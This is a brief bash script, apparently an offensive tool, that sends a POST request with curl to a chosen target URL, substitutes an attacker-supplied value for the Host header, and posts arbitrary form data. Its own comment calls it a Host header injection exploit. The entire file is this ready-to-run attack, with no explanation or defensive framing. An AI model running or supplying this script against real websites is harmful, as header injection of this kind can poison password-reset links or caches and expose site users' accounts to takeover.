#!/bin/bash

# ARGUMENTS
NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# Check arguments
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <new_host> <target_url> <form_data>"
    exit 1
fi

# Exploit Host Header Injection
curl -s \
     -X POST "$TARGET_URL" \
     -H "Host: $NEW_HOST" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "$FORM_DATA"

